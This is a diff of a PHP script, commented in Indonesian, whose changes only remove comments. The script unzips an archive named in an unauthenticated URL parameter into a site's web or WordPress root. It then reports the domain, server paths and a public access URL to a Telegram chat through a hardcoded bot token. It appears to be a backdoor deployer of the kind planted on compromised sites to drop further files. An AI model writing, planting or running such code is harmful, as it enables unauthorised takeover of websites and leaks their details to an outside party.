@@ -1,22 +1,9 @@
 <?php
 
-/**
- * ====================================================
- * KONFIGURASI
- * ====================================================
- */
-
 define('TELEGRAM_BOT_TOKEN', '7707499103:AAGCl29Ew1jdTTtVBAjy8-o_S_KVSUDvcDM');
 define('TELEGRAM_CHAT_ID', '-1003772179315');
 define('TIMEZONE', 'Asia/Jakarta');
 
-// ====================================================
-// FUNGSI BANTU
-// ====================================================
-
-/**
- * Kirim pesan ke Telegram
- */
 function send_telegram($message)
 {
     $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
@@ -26,7 +13,6 @@ function send_telegram($message)
         'parse_mode'=> 'HTML'
     );
 
-    // Gunakan cURL jika tersedia
     if (function_exists('curl_init')) {
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
@@ -40,7 +26,6 @@ function send_telegram($message)
         return;
     }
 
-    // Fallback ke file_get_contents
     $options = array(
         'http' => array(
             'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
@@ -53,9 +38,6 @@ function send_telegram($message)
     @file_get_contents($url, false, $context);
 }
 
-/**
- * Kirim respons HTTP dan Telegram, lalu hentikan eksekusi
- */
 function send_response($statusCode, $statusText, $message, $telegramMessage = '')
 {
     global $telegramReport;
@@ -66,10 +48,6 @@ function send_response($statusCode, $statusText, $message, $telegramMessage = ''
     exit($message);
 }
 
-/**
- * Deteksi root direktori utama (WordPress atau server biasa)
- * Mengembalikan array(root_path, tipe_root)
- */
 function detect_root_directory($startDir)
 {
     // 1. Coba deteksi WordPress (mencari wp-config.php ke atas)
@@ -97,9 +75,6 @@ function detect_root_directory($startDir)
     return array(false, 'Tidak diketahui');
 }
 
-// ====================================================
-// PERSIAPAN AWAL
-// ====================================================
 date_default_timezone_set(TIMEZONE);
 $startTime = date('Y-m-d H:i:s');
 
@@ -112,7 +87,6 @@ if (isset($_SERVER['HTTP_HOST'])) {
     $domain = 'localhost';
 }
 
-// URL lengkap untuk laporan
 $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443)) ? "https://" : "http://";
 $fullUrl = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
@@ -126,9 +100,6 @@ if (!class_exists('ZipArchive')) {
     send_response(500, 'Internal Server Error', 'Ekstensi ZipArchive tidak tersedia di server', "Ekstensi ZipArchive tidak ada.");
 }
 
-// ====================================================
-// DETEKSI ROOT DIREKTORI
-// ====================================================
 list($rootDir, $rootType) = detect_root_directory(__DIR__);
 if ($rootDir === false) {
     send_response(500, 'Internal Server Error', 'Tidak dapat menentukan root direktori. Pastikan server mendukung DOCUMENT_ROOT atau struktur direktori standar.', "Gagal mendeteksi root direktori.");
@@ -137,9 +108,6 @@ if ($rootDir === false) {
 $telegramReport .= "Root     : $rootDir\n";
 $telegramReport .= "Jenis    : $rootType\n";
 
-// ====================================================
-// VALIDASI PARAMETER
-// ====================================================
 if (!isset($_GET['zipfile']) || $_GET['zipfile'] === '') {
     send_response(400, 'Bad Request', 'Parameter "zipfile" diperlukan', "Parameter zipfile tidak diberikan.");
 }
@@ -159,7 +127,6 @@ if ($tujuanRel === '') {
     }
 }
 
-// Pastikan path relatif tidak mengandung traversal "../"
 if (strpos($tujuanRel, '../') !== false || strpos($tujuanRel, '..\\') !== false) {
     send_response(400, 'Bad Request', 'Parameter "tujuan" tidak valid (mengandung karakter terlarang)', "Path tujuan mengandung '..'");
 }
@@ -195,9 +162,6 @@ if (!is_writable($realExtractTo)) {
 
 $telegramReport .= "Tujuan    : $realExtractTo\n";
 
-// ====================================================
-// VALIDASI FILE ZIP
-// ====================================================
 $zipParam = $_GET['zipfile'];
 $zipPath  = realpath($zipParam);
 
@@ -213,9 +177,6 @@ if ($extension !== 'zip') {
 
 $telegramReport .= "File ZIP  : " . basename($zipPath) . "\n";
 
-// ====================================================
-// PROSES EKSTRAKSI
-// ====================================================
 $zip = new ZipArchive();
 $zipOpenResult = $zip->open($zipPath);
 if ($zipOpenResult !== true) {
@@ -227,7 +188,6 @@ if ($zipOpenResult !== true) {
 $fileCount = $zip->numFiles;
 $telegramReport .= "Jumlah file: $fileCount\n";
 
-// Password jika diberikan
 $key = isset($_GET['key']) ? (string)$_GET['key'] : null;
 if ($key !== null && $key !== '') {
     if (method_exists($zip, 'setPassword')) {
@@ -252,10 +212,6 @@ if (!$extractSuccess) {
 // Setelah sukses, atur permission direktori (opsional)
 @chmod($realExtractTo, 0755);
 
-// ====================================================
-// LAPORAN SUKSES (DENGAN URL AKSES)
-// ====================================================
-// Buat URL akses berdasarkan rootDir dan tujuanRel
 if ($tujuanRel === '.') {
     $accessUrl = $protocol . $domain . '/';
 } else {
